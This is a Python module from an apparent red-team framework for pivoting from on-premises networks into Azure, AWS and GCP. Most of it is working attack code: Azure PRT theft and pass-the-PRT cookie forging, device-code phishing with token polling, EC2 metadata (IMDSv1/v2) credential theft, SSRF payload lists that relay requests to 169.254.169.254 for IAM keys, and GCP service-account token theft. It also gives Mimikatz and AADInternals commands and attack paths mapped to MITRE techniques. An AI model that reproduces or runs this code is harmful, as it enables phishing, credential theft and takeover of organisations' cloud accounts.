"""
Cloud Pivot Module - Zero-Trust Bypass & Hybrid Lateral Movement

On-prem'den cloud ortamlarına (Azure AD, AWS, GCP) lateral movement.

Features:
- Azure AD PRT (Primary Refresh Token) hijacking
- AWS EC2 metadata relay & credential theft
- GCP service account impersonation
- Hybrid AD seamless pivot
- Zero-trust bypass techniques
- Cloud weak credential detection

Author: Monolith Red Team Framework
"""

import os
import json
import base64
import hashlib
import hmac
import struct
import logging
import asyncio
import aiohttp
import requests
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Callable
from datetime import datetime, timedelta
from urllib.parse import urlencode, urlparse
import xml.etree.ElementTree as ET

logger = logging.getLogger(__name__)


# =============================================================================
# ENUMS & CONSTANTS
# =============================================================================

class CloudProvider(Enum):
    """Supported cloud providers"""
    AZURE = "azure"
    AWS = "aws"
    GCP = "gcp"
    HYBRID = "hybrid"  # Multi-cloud


class PivotMethod(Enum):
    """Cloud pivot methods"""
    # Azure
    PRT_HIJACK = "prt_hijack"
    DEVICE_CODE_PHISH = "device_code_phish"
    AAD_JOIN = "aad_join"
    PASS_THE_PRT = "pass_the_prt"
    ROADTX = "roadtx"
    
    # AWS
    METADATA_RELAY = "metadata_relay"
    IMDS_V1 = "imds_v1"
    IMDS_V2 = "imds_v2"
    SSRF_PIVOT = "ssrf_pivot"
    ROLE_CHAIN = "role_chain"
    
    # GCP
    METADATA_GCP = "metadata_gcp"
    SERVICE_ACCOUNT = "service_account"
    WORKLOAD_IDENTITY = "workload_identity"
    
    # Generic
    OAUTH_ABUSE = "oauth_abuse"
    SAML_FORGE = "saml_forge"
    OIDC_ABUSE = "oidc_abuse"


class TokenType(Enum):
    """Token types for cloud authentication"""
    PRT = "primary_refresh_token"
    ACCESS_TOKEN = "access_token"
    REFRESH_TOKEN = "refresh_token"
    SESSION_KEY = "session_key"
    DEVICE_CODE = "device_code"
    JWT = "jwt"
    SAML = "saml_assertion"
    AWS_CREDS = "aws_credentials"
    GCP_TOKEN = "gcp_token"


class AttackPhase(Enum):
    """Attack chain phases"""
    RECON = "reconnaissance"
    TOKEN_THEFT = "token_theft"
    PIVOT = "pivot"
    PERSISTENCE = "persistence"
    LATERAL = "lateral_movement"
    EXFIL = "exfiltration"


# Azure endpoints
AZURE_ENDPOINTS = {
    "login": "https://login.microsoftonline.com",
    "graph": "https://graph.microsoft.com",
    "management": "https://management.azure.com",
    "vault": "https://vault.azure.net",
    "storage": "https://storage.azure.com",
    "device_code": "https://login.microsoftonline.com/common/oauth2/devicecode",
    "token": "https://login.microsoftonline.com/common/oauth2/token",
}

# AWS metadata endpoints
AWS_ENDPOINTS = {
    "metadata_v1": "http://169.254.169.254/latest/meta-data/",
    "metadata_v2": "http://169.254.169.254/latest/api/token",
    "iam_creds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "user_data": "http://169.254.169.254/latest/user-data",
    "identity_doc": "http://169.254.169.254/latest/dynamic/instance-identity/document",
}

# GCP metadata endpoints  
GCP_ENDPOINTS = {
    "metadata": "http://metadata.google.internal/computeMetadata/v1/",
    "service_account": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "project": "http://metadata.google.internal/computeMetadata/v1/project/",
    "token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
}

# Known weak Azure app IDs (for testing)
AZURE_WEAK_APPS = {
    "1950a258-227b-4e31-a9cf-717495945fc2": "Microsoft Azure PowerShell",
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264": "Microsoft Teams",
    "00000002-0000-0ff1-ce00-000000000000": "Office 365 Exchange Online",
    "00000003-0000-0000-c000-000000000000": "Microsoft Graph",
    "d3590ed6-52b3-4102-aeff-aad2292ab01c": "Microsoft Office",
    "29d9ed98-a469-4536-ade2-f981bc1d605e": "Microsoft Authentication Broker",
}


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class CloudCredential:
    """Cloud credential container"""
    provider: CloudProvider
    credential_type: TokenType
    value: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    expires_at: Optional[datetime] = None
    scope: List[str] = field(default_factory=list)
    source: str = ""  # Where credential came from
    
    def is_valid(self) -> bool:
        """Check if credential is still valid"""
        if self.expires_at is None:
            return True
        return datetime.now() < self.expires_at
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "provider": self.provider.value,
            "type": self.credential_type.value,
            "value": self.value[:50] + "..." if len(self.value) > 50 else self.value,
            "expires_at": self.expires_at.isoformat() if self.expires_at else None,
            "scope": self.scope,
            "source": self.source,
        }


@dataclass
class PRTContext:
    """Azure PRT context for pass-the-PRT attacks"""
    prt: str
    session_key: bytes
    device_id: str
    tenant_id: str
    user_upn: str
    derived_key: bytes = None
    nonce: str = ""
    
    def derive_key(self, context: bytes) -> bytes:
        """Derive key from session key using KDFSP800108"""
        # KDF implementation for PRT
        label = b"AzureAD-SecureConversation"
        
        # SP800-108 Counter Mode
        counter = struct.pack(">I", 1)
        fixed_input = label + b"\x00" + context + struct.pack(">I", 256)
        
        derived = hmac.new(self.session_key, counter + fixed_input, hashlib.sha256).digest()
        self.derived_key = derived
        return derived


@dataclass
class AWSCredentials:
    """AWS temporary credentials"""
    access_key_id: str
    secret_access_key: str
    session_token: str
    expiration: datetime
    role_arn: str = ""
    region: str = "us-east-1"
    
    def to_env_vars(self) -> Dict[str, str]:
        """Convert to environment variables"""
        return {
            "AWS_ACCESS_KEY_ID": self.access_key_id,
            "AWS_SECRET_ACCESS_KEY": self.secret_access_key,
            "AWS_SESSION_TOKEN": self.session_token,
            "AWS_DEFAULT_REGION": self.region,
        }


@dataclass
class GCPCredentials:
    """GCP service account credentials"""
    access_token: str
    token_type: str
    expires_in: int
    service_account: str
    scopes: List[str] = field(default_factory=list)


@dataclass
class PivotResult:
    """Result of a cloud pivot operation"""
    success: bool
    method: PivotMethod
    source: str  # Source environment
    target: str  # Target environment
    credentials: Optional[CloudCredential] = None
    error: str = ""
    attack_path: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "method": self.method.value,
            "source": self.source,
            "target": self.target,
            "credentials": self.credentials.to_dict() if self.credentials else None,
            "error": self.error,
            "attack_path": self.attack_path,
            "recommendations": self.recommendations,
        }


@dataclass
class CloudAttackPath:
    """Suggested cloud attack path"""
    path_id: str
    name: str
    description: str
    steps: List[Dict[str, Any]]
    difficulty: str  # easy, medium, hard
    stealth_level: str  # low, medium, high
    success_probability: float
    required_access: List[str]
    mitre_techniques: List[str]


# =============================================================================
# AZURE PRT HIJACKER
# =============================================================================

class AzurePRTHijacker:
    """
    Azure Primary Refresh Token (PRT) Hijacking
    
    PRT is a JWT issued to Azure AD joined/registered devices.
    Stealing PRT allows seamless SSO to all Azure AD resources.
    
    Attack vectors:
    1. Mimikatz sekurlsa::cloudap
    2. ROADtools/ROADtoken
    3. RequestADFSToken.exe
    4. AADInternals
    5. TokenTactics
    """
    
    def __init__(self, tenant_id: str = None):
        self.tenant_id = tenant_id
        self.prt_cache: Dict[str, PRTContext] = {}
        
    async def extract_prt_mimikatz(self, target: str, creds: Dict) -> Optional[PRTContext]:
        """
        Extract PRT using Mimikatz sekurlsa::cloudap
        
        Requires local admin on Azure AD joined device.
        """
        logger.info(f"[PRT] Extracting PRT from {target} via Mimikatz")
        
        # Mimikatz command for PRT extraction
        mimi_cmd = """
        privilege::debug
        sekurlsa::cloudap
        exit
        """
        
        # In real implementation, execute via WMI/PSExec
        # Here we simulate the extraction
        
        result = {
            "prt": None,
            "session_key": None,
            "device_id": None,
            "tenant_id": None,
            "user_upn": None,
        }
        
        # Simulated extraction logic
        # Real implementation would parse Mimikatz output
        
        if result["prt"]:
            context = PRTContext(
                prt=result["prt"],
                session_key=base64.b64decode(result["session_key"]),
                device_id=result["device_id"],
                tenant_id=result["tenant_id"],
                user_upn=result["user_upn"],
            )
            self.prt_cache[result["user_upn"]] = context
            return context
        
        return None
    
    async def extract_prt_roadtools(self, target: str) -> Optional[PRTContext]:
        """
        Extract PRT using ROADtools
        
        ROADtoken can dump PRT from BrowserCore.exe or CloudAP
        """
        logger.info(f"[PRT] Extracting PRT from {target} via ROADtools")
        
        # ROADtoken command
        roadtoken_cmd = "roadtoken.exe --dump"
        
        # Parse output for PRT and session key
        # ...
        
        return None
    
    async def pass_the_prt(
        self,
        prt_context: PRTContext,
        target_resource: str = "https://graph.microsoft.com"
    ) -> Optional[CloudCredential]:
        """
        Pass-the-PRT attack to obtain access token
        
        Uses stolen PRT to request access tokens for any Azure resource.
        """
        logger.info(f"[PRT] Pass-the-PRT attack for {target_resource}")
        
        try:
            # Generate nonce
            nonce = await self._get_nonce()
            prt_context.nonce = nonce
            
            # Derive session key
            context = nonce.encode()
            prt_context.derive_key(context)
            
            # Create PRT cookie
            prt_cookie = self._create_prt_cookie(prt_context)
            
            # Request access token
            token_url = f"{AZURE_ENDPOINTS['login']}/{prt_context.tenant_id}/oauth2/token"
            
            headers = {
                "x-ms-RefreshTokenCredential": prt_cookie,
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            data = {
                "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                "request": prt_cookie,
                "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",  # MS Auth Broker
                "resource": target_resource,
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(token_url, headers=headers, data=data) as resp:
                    if resp.status == 200:
                        token_data = await resp.json()
                        
                        return CloudCredential(
                            provider=CloudProvider.AZURE,
                            credential_type=TokenType.ACCESS_TOKEN,
                            value=token_data["access_token"],
                            metadata={
                                "resource": target_resource,
                                "token_type": token_data.get("token_type", "Bearer"),
                            },
                            expires_at=datetime.now() + timedelta(seconds=token_data.get("expires_in", 3600)),
                            scope=[target_resource],
                            source="pass_the_prt",
                        )
            
        except Exception as e:
            logger.error(f"[PRT] Pass-the-PRT failed: {e}")
        
        return None
    
    async def _get_nonce(self) -> str:
        """Get nonce from Azure AD for PRT signing"""
        url = f"{AZURE_ENDPOINTS['login']}/common/oauth2/token"
        
        data = {
            "grant_type": "srv_challenge",
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data) as resp:
                    if resp.status == 200:
                        result = await resp.json()
                        return result.get("Nonce", "")
        except:
            pass
        
        return base64.b64encode(os.urandom(32)).decode()
    
    def _create_prt_cookie(self, prt_context: PRTContext) -> str:
        """Create signed PRT cookie for authentication"""
        # JWT header
        header = {
            "alg": "HS256",
            "typ": "JWT",
            "ctx": base64.b64encode(prt_context.nonce.encode()).decode(),
        }
        
        # JWT payload
        payload = {
            "refresh_token": prt_context.prt,
            "is_primary": "true",
            "iat": int(datetime.now().timestamp()),
        }
        
        # Encode
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        
        # Sign with derived key
        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            prt_context.derived_key or prt_context.session_key,
            message.encode(),
            hashlib.sha256
        ).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
        
        return f"{header_b64}.{payload_b64}.{signature_b64}"
    
    async def device_code_phish(
        self,
        client_id: str = "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # MS Office
        resource: str = "https://graph.microsoft.com"
    ) -> Tuple[str, str]:
        """
        Device code phishing attack
        
        Generate device code for phishing, victim enters code at microsoft.com/devicelogin
        """
        logger.info("[PRT] Starting device code phishing flow")
        
        url = AZURE_ENDPOINTS["device_code"]
        
        data = {
            "client_id": client_id,
            "resource": resource,
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data) as resp:
                    if resp.status == 200:
                        result = await resp.json()
                        
                        user_code = result["user_code"]
                        device_code = result["device_code"]
                        verification_url = result["verification_uri"]
                        
                        logger.info(f"[PHISH] Device Code: {user_code}")
                        logger.info(f"[PHISH] URL: {verification_url}")
                        
                        return user_code, device_code
        except Exception as e:
            logger.error(f"[PRT] Device code phishing failed: {e}")
        
        return None, None
    
    async def poll_device_code(
        self,
        device_code: str,
        client_id: str = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        resource: str = "https://graph.microsoft.com",
        timeout: int = 900
    ) -> Optional[CloudCredential]:
        """Poll for device code completion"""
        logger.info("[PRT] Polling for device code authentication...")
        
        url = AZURE_ENDPOINTS["token"]
        start_time = datetime.now()
        
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": client_id,
            "code": device_code,
            "resource": resource,
        }
        
        while (datetime.now() - start_time).seconds < timeout:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data=data) as resp:
                        result = await resp.json()
                        
                        if "access_token" in result:
                            logger.info("[PRT] Device code authentication successful!")
                            
                            return CloudCredential(
                                provider=CloudProvider.AZURE,
                                credential_type=TokenType.ACCESS_TOKEN,
                                value=result["access_token"],
                                metadata={
                                    "refresh_token": result.get("refresh_token"),
                                    "resource": resource,
                                },
                                expires_at=datetime.now() + timedelta(seconds=result.get("expires_in", 3600)),
                                scope=[resource],
                                source="device_code_phish",
                            )
                        
                        error = result.get("error", "")
                        if error == "authorization_pending":
                            await asyncio.sleep(5)
                        elif error in ["authorization_declined", "expired_token"]:
                            logger.warning(f"[PRT] Device code failed: {error}")
                            break
                        else:
                            await asyncio.sleep(5)
                            
            except Exception as e:
                logger.error(f"[PRT] Polling error: {e}")
                await asyncio.sleep(5)
        
        return None


# =============================================================================
# AWS METADATA RELAY
# =============================================================================

class AWSMetadataRelay:
    """
    AWS EC2 Metadata Service (IMDS) Exploitation
    
    Attack vectors:
    1. IMDSv1 - Direct access (no token required)
    2. IMDSv2 - Token-based (requires PUT request)
    3. SSRF - Relay through vulnerable web app
    4. Role chaining - Pivot across accounts
    """
    
    def __init__(self):
        self.credentials_cache: Dict[str, AWSCredentials] = {}
        self.ssrf_payloads = self._generate_ssrf_payloads()
    
    def _generate_ssrf_payloads(self) -> List[str]:
        """Generate SSRF payloads for metadata access"""
        base_urls = [
            "http://169.254.169.254/",
            "http://[::ffff:169.254.169.254]/",  # IPv6
            "http://169.254.169.254.nip.io/",  # DNS rebinding
            "http://metadata.google.internal/",  # GCP
            "http://169.254.169.254:80/",
            "http://instance-data/",  # AWS alternative
        ]
        
        paths = [
            "latest/meta-data/iam/security-credentials/",
            "latest/user-data",
            "latest/dynamic/instance-identity/document",
            "latest/meta-data/hostname",
        ]
        
        payloads = []
        for base in base_urls:
            for path in paths:
                payloads.append(base + path)
        
        return payloads
    
    async def exploit_imdsv1(self, target: str = None) -> Optional[AWSCredentials]:
        """
        Exploit IMDSv1 (no token required)
        
        Direct HTTP GET to metadata endpoint.
        Works if IMDSv2 is not enforced.
        """
        logger.info("[AWS] Attempting IMDSv1 exploitation")
        
        try:
            # Get IAM role name
            role_url = AWS_ENDPOINTS["iam_creds"]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(role_url, timeout=5) as resp:
                    if resp.status == 200:
                        role_name = (await resp.text()).strip()
                        logger.info(f"[AWS] Found IAM role: {role_name}")
                        
                        # Get credentials
                        creds_url = f"{role_url}{role_name}"
                        async with session.get(creds_url, timeout=5) as creds_resp:
                            if creds_resp.status == 200:
                                creds_data = await creds_resp.json()
                                
                                credentials = AWSCredentials(
                                    access_key_id=creds_data["AccessKeyId"],
                                    secret_access_key=creds_data["SecretAccessKey"],
                                    session_token=creds_data["Token"],
                                    expiration=datetime.fromisoformat(creds_data["Expiration"].replace("Z", "+00:00")),
                                    role_arn=f"arn:aws:iam::*:role/{role_name}",
                                )
                                
                                self.credentials_cache[role_name] = credentials
                                logger.info(f"[AWS] IMDSv1 credentials obtained for {role_name}")
                                return credentials
                                
        except asyncio.TimeoutError:
            logger.warning("[AWS] IMDSv1 request timed out (not on EC2?)")
        except Exception as e:
            logger.error(f"[AWS] IMDSv1 exploitation failed: {e}")
        
        return None
    
    async def exploit_imdsv2(self, target: str = None) -> Optional[AWSCredentials]:
        """
        Exploit IMDSv2 (token required)
        
        Requires PUT request to get token first.
        """
        logger.info("[AWS] Attempting IMDSv2 exploitation")
        
        try:
            # Get IMDSv2 token
            token_url = AWS_ENDPOINTS["metadata_v2"]
            headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
            
            async with aiohttp.ClientSession() as session:
                async with session.put(token_url, headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        token = await resp.text()
                        logger.info("[AWS] IMDSv2 token obtained")
                        
                        # Use token to get credentials
                        meta_headers = {"X-aws-ec2-metadata-token": token}
                        
                        # Get role name
                        role_url = AWS_ENDPOINTS["iam_creds"]
                        async with session.get(role_url, headers=meta_headers, timeout=5) as role_resp:
                            if role_resp.status == 200:
                                role_name = (await role_resp.text()).strip()
                                
                                # Get credentials
                                creds_url = f"{role_url}{role_name}"
                                async with session.get(creds_url, headers=meta_headers, timeout=5) as creds_resp:
                                    if creds_resp.status == 200:
                                        creds_data = await creds_resp.json()
                                        
                                        credentials = AWSCredentials(
                                            access_key_id=creds_data["AccessKeyId"],
                                            secret_access_key=creds_data["SecretAccessKey"],
                                            session_token=creds_data["Token"],
                                            expiration=datetime.fromisoformat(creds_data["Expiration"].replace("Z", "+00:00")),
                                            role_arn=f"arn:aws:iam::*:role/{role_name}",
                                        )
                                        
                                        self.credentials_cache[role_name] = credentials
                                        logger.info(f"[AWS] IMDSv2 credentials obtained for {role_name}")
                                        return credentials
                                        
        except asyncio.TimeoutError:
            logger.warning("[AWS] IMDSv2 request timed out")
        except Exception as e:
            logger.error(f"[AWS] IMDSv2 exploitation failed: {e}")
        
        return None
    
    async def ssrf_relay(
        self,
        vulnerable_url: str,
        ssrf_param: str = "url",
        method: str = "GET"
    ) -> Optional[AWSCredentials]:
        """
        Relay metadata request through SSRF vulnerability
        
        Args:
            vulnerable_url: URL with SSRF vulnerability
            ssrf_param: Parameter name for SSRF injection
            method: HTTP method (GET/POST)
        """
        logger.info(f"[AWS] SSRF relay through {vulnerable_url}")
        
        for payload in self.ssrf_payloads:
            if "iam/security-credentials" in payload:
                try:
                    # Inject payload
                    if method.upper() == "GET":
                        full_url = f"{vulnerable_url}?{ssrf_param}={payload}"
                        async with aiohttp.ClientSession() as session:
                            async with session.get(full_url, timeout=10) as resp:
                                if resp.status == 200:
                                    content = await resp.text()
                                    
                                    # Parse role name
                                    role_name = content.strip().split("\n")[0]
                                    if role_name and not role_name.startswith("<"):
                                        logger.info(f"[AWS] SSRF found role: {role_name}")
                                        
                                        # Get credentials
                                        creds_payload = f"{payload}{role_name}"
                                        creds_url = f"{vulnerable_url}?{ssrf_param}={creds_payload}"
                                        
                                        async with session.get(creds_url, timeout=10) as creds_resp:
                                            if creds_resp.status == 200:
                                                creds_data = await creds_resp.json()
                                                
                                                credentials = AWSCredentials(
                                                    access_key_id=creds_data["AccessKeyId"],
                                                    secret_access_key=creds_data["SecretAccessKey"],
                                                    session_token=creds_data["Token"],
                                                    expiration=datetime.fromisoformat(creds_data["Expiration"].replace("Z", "+00:00")),
                                                    role_arn=f"arn:aws:iam::*:role/{role_name}",
                                                )
                                                
                                                logger.info("[AWS] SSRF relay successful!")
                                                return credentials
                                                
                except Exception as e:
                    continue
        
        logger.warning("[AWS] SSRF relay failed")
        return None
    
    async def get_instance_identity(self) -> Dict[str, Any]:
        """Get EC2 instance identity document"""
        try:
            url = AWS_ENDPOINTS["identity_doc"]
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        return await resp.json()
        except:
            pass
        return {}
    
    async def get_user_data(self) -> str:
        """Get EC2 user data (may contain secrets)"""
        try:
            url = AWS_ENDPOINTS["user_data"]
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        return await resp.text()
        except:
            pass
        return ""


# =============================================================================
# GCP METADATA EXPLOITER
# =============================================================================

class GCPMetadataExploiter:
    """
    GCP Metadata Service Exploitation
    
    Attack vectors:
    1. Service account token theft
    2. Project metadata enumeration
    3. Custom metadata secrets
    4. Workload identity abuse
    """
    
    def __init__(self):
        self.credentials_cache: Dict[str, GCPCredentials] = {}
    
    async def get_access_token(self, service_account: str = "default") -> Optional[GCPCredentials]:
        """
        Get access token from metadata service
        
        Requires Metadata-Flavor: Google header
        """
        logger.info(f"[GCP] Getting access token for {service_account}")
        
        try:
            url = f"{GCP_ENDPOINTS['service_account']}{service_account}/token"
            headers = {"Metadata-Flavor": "Google"}
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        
                        credentials = GCPCredentials(
                            access_token=data["access_token"],
                            token_type=data.get("token_type", "Bearer"),
                            expires_in=data.get("expires_in", 3600),
                            service_account=service_account,
                        )
                        
                        self.credentials_cache[service_account] = credentials
                        logger.info(f"[GCP] Access token obtained for {service_account}")
                        return credentials
                        
        except asyncio.TimeoutError:
            logger.warning("[GCP] Metadata request timed out")
        except Exception as e:
            logger.error(f"[GCP] Token theft failed: {e}")
        
        return None
    
    async def enumerate_service_accounts(self) -> List[str]:
        """Enumerate available service accounts"""
        try:
            url = GCP_ENDPOINTS["service_account"]
            headers = {"Metadata-Flavor": "Google"}
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        accounts = [a.strip("/") for a in content.strip().split("\n") if a]
                        logger.info(f"[GCP] Found service accounts: {accounts}")
                        return accounts
        except:
            pass
        return []
    
    async def get_project_metadata(self) -> Dict[str, Any]:
        """Get project-level metadata"""
        metadata = {}
        
        try:
            headers = {"Metadata-Flavor": "Google"}
            
            async with aiohttp.ClientSession() as session:
                # Project ID
                async with session.get(f"{GCP_ENDPOINTS['project']}project-id", headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        metadata["project_id"] = await resp.text()
                
                # Numeric project ID
                async with session.get(f"{GCP_ENDPOINTS['project']}numeric-project-id", headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        metadata["numeric_project_id"] = await resp.text()
                
                # Custom attributes
                async with session.get(f"{GCP_ENDPOINTS['project']}attributes/", headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        attrs = (await resp.text()).strip().split("\n")
                        metadata["custom_attributes"] = attrs
                        
        except Exception as e:
            logger.error(f"[GCP] Project metadata enumeration failed: {e}")
        
        return metadata


# =============================================================================
# HYBRID AD PIVOT
# =============================================================================

class HybridADPivot:
    """
    Hybrid AD Pivot - On-prem to Cloud
    
    Techniques:
    1. Azure AD Connect abuse (sync account)
    2. Pass-the-Hash to Azure
    3. ADFS token forging (Golden SAML)
    4. Seamless SSO abuse
    5. PHS/PTA exploitation
    """
    
    def __init__(self, domain: str = None):
        self.domain = domain
        self.prt_hijacker = AzurePRTHijacker()
        self.sync_accounts: List[Dict] = []
    
    async def find_azure_ad_connect(self, domain_controller: str) -> Dict[str, Any]:
        """
        Find Azure AD Connect installation and sync account
        
        The MSOL_ account has DCSync-equivalent rights!
        """
        logger.info(f"[HYBRID] Looking for Azure AD Connect on {domain_controller}")
        
        result = {
            "found": False,
            "server": None,
            "sync_account": None,
            "sync_account_password": None,
            "database": None,
        }
        
        # Common patterns
        # 1. MSOL_<guid>@<tenant>.onmicrosoft.com
        # 2. Sync_<server>_<guid>@<tenant>.onmicrosoft.com
        
        # LDAP query for sync accounts
        sync_filter = "(|(userPrincipalName=MSOL_*)(userPrincipalName=Sync_*))"
        
        # In real implementation, query AD
        # result["sync_account"] = ...
        
        return result
    
    async def extract_aadc_credentials(self, aad_connect_server: str) -> Optional[Dict]:
        """
        Extract Azure AD Connect sync account credentials
        
        Methods:
        1. LocalDB extraction (requires admin)
        2. Registry extraction
        3. Memory dump
        """
        logger.info(f"[HYBRID] Extracting AADC credentials from {aad_connect_server}")
        
        # AADInternals PowerShell command
        ps_cmd = """
        Import-Module AADInternals
        Get-AADIntSyncCredentials
        """
        
        # In real implementation, execute and parse
        
        return None
    
    async def golden_saml_attack(
        self,
        adfs_server: str,
        target_user: str,
        signing_cert: bytes = None
    ) -> Optional[CloudCredential]:
        """
        Golden SAML attack via ADFS
        
        Forge SAML tokens to access any Azure AD resource.
        Requires ADFS token signing certificate.
        """
        logger.info(f"[HYBRID] Golden SAML attack for {target_user}")
        
        if not signing_cert:
            # Extract from ADFS
            signing_cert = await self._extract_adfs_cert(adfs_server)
        
        if not signing_cert:
            logger.error("[HYBRID] Could not obtain ADFS signing certificate")
            return None
        
        # Forge SAML assertion
        saml_assertion = self._forge_saml_assertion(target_user, signing_cert)
        
        if saml_assertion:
            return CloudCredential(
                provider=CloudProvider.AZURE,
                credential_type=TokenType.SAML,
                value=saml_assertion,
                metadata={
                    "target_user": target_user,
                    "attack": "golden_saml",
                },
                scope=["*"],
                source="golden_saml",
            )
        
        return None
    
    async def _extract_adfs_cert(self, adfs_server: str) -> Optional[bytes]:
        """Extract ADFS token signing certificate"""
        # Methods:
        # 1. AD replication (DKM key)
        # 2. ADFS database query
        # 3. Memory extraction
        
        return None
    
    def _forge_saml_assertion(self, target_user: str, signing_cert: bytes) -> str:
        """Forge SAML assertion for target user"""
        # Create SAML assertion XML
        # Sign with certificate
        # Base64 encode
        
        return ""
    
    async def seamless_sso_abuse(
        self,
        computer_account: str,
        computer_hash: str
    ) -> Optional[CloudCredential]:
        """
        Abuse Seamless SSO via AZUREADSSOACC$ computer account
        
        The AZUREADSSOACC$ account's password hash can forge Kerberos tickets.
        """
        logger.info(f"[HYBRID] Seamless SSO abuse with {computer_account}")
        
        # Create silver ticket for Azure AD
        # ...
        
        return None


# =============================================================================
# CLOUD ATTACK PATH SUGGESTER
# =============================================================================

class CloudAttackPathSuggester:
    """
    AI-powered cloud attack path suggestion
    
    Analyzes current access and suggests optimal paths
    for cloud lateral movement and privilege escalation.
    """
    
    def __init__(self):
        self.attack_paths: List[CloudAttackPath] = self._load_attack_paths()
    
    def _load_attack_paths(self) -> List[CloudAttackPath]:
        """Load predefined attack paths"""
        return [
            # Azure paths
            CloudAttackPath(
                path_id="azure_prt_to_graph",
                name="PRT to Microsoft Graph",
                description="Steal PRT from Azure AD joined device, use for Graph API access",
                steps=[
                    {"action": "Compromise Azure AD joined workstation", "technique": "T1078"},
                    {"action": "Extract PRT via Mimikatz/ROADtools", "technique": "T1528"},
                    {"action": "Pass-the-PRT for Graph token", "technique": "T1550"},
                    {"action": "Enumerate users, groups, applications", "technique": "T1087"},
                ],
                difficulty="medium",
                stealth_level="medium",
                success_probability=0.75,
                required_access=["local_admin_on_aad_device"],
                mitre_techniques=["T1078", "T1528", "T1550", "T1087"],
            ),
            CloudAttackPath(
                path_id="azure_device_code_phish",
                name="Device Code Phishing",
                description="Phish user via device code flow, gain their Azure tokens",
                steps=[
                    {"action": "Generate device code", "technique": "T1566"},
                    {"action": "Send phishing email with code", "technique": "T1566.002"},
                    {"action": "User authenticates at microsoft.com/devicelogin", "technique": "T1078"},
                    {"action": "Capture access + refresh tokens", "technique": "T1528"},
                ],
                difficulty="easy",
                stealth_level="low",
                success_probability=0.60,
                required_access=["email_access"],
                mitre_techniques=["T1566", "T1566.002", "T1078", "T1528"],
            ),
            CloudAttackPath(
                path_id="azure_aadc_pivot",
                name="Azure AD Connect Sync Account Abuse",
                description="Extract AADC sync account, perform DCSync-like operations",
                steps=[
                    {"action": "Identify Azure AD Connect server", "technique": "T1018"},
                    {"action": "Extract MSOL_ account credentials", "technique": "T1003"},
                    {"action": "DCSync via sync account", "technique": "T1003.006"},
                    {"action": "Forge tokens for cloud access", "technique": "T1550"},
                ],
                difficulty="hard",
                stealth_level="medium",
                success_probability=0.80,
                required_access=["admin_on_aadc_server"],
                mitre_techniques=["T1018", "T1003", "T1003.006", "T1550"],
            ),
            CloudAttackPath(
                path_id="azure_golden_saml",
                name="Golden SAML via ADFS",
                description="Extract ADFS signing cert, forge SAML tokens for any user",
                steps=[
                    {"action": "Compromise ADFS server", "technique": "T1078"},
                    {"action": "Extract token signing certificate", "technique": "T1552"},
                    {"action": "Forge SAML assertion", "technique": "T1606.002"},
                    {"action": "Access any Azure AD resource", "technique": "T1550"},
                ],
                difficulty="hard",
                stealth_level="high",
                success_probability=0.90,
                required_access=["admin_on_adfs", "domain_admin"],
                mitre_techniques=["T1078", "T1552", "T1606.002", "T1550"],
            ),
            
            # AWS paths
            CloudAttackPath(
                path_id="aws_ssrf_to_keys",
                name="SSRF to AWS Keys",
                description="Exploit SSRF to steal IAM credentials from metadata service",
                steps=[
                    {"action": "Identify SSRF vulnerability", "technique": "T1190"},
                    {"action": "Relay request to 169.254.169.254", "technique": "T1557"},
                    {"action": "Extract IAM role credentials", "technique": "T1552.005"},
                    {"action": "Pivot to other AWS services", "technique": "T1078.004"},
                ],
                difficulty="medium",
                stealth_level="medium",
                success_probability=0.70,
                required_access=["ssrf_vulnerability"],
                mitre_techniques=["T1190", "T1557", "T1552.005", "T1078.004"],
            ),
            CloudAttackPath(
                path_id="aws_imds_exploit",
                name="EC2 IMDS Exploitation",
                description="Direct metadata service access on compromised EC2",
                steps=[
                    {"action": "Gain shell on EC2 instance", "technique": "T1078"},
                    {"action": "Query IMDS for IAM credentials", "technique": "T1552.005"},
                    {"action": "Enumerate accessible resources", "technique": "T1087.004"},
                    {"action": "Pivot via role chaining", "technique": "T1098"},
                ],
                difficulty="easy",
                stealth_level="high",
                success_probability=0.85,
                required_access=["ec2_shell"],
                mitre_techniques=["T1078", "T1552.005", "T1087.004", "T1098"],
            ),
            CloudAttackPath(
                path_id="aws_role_chain",
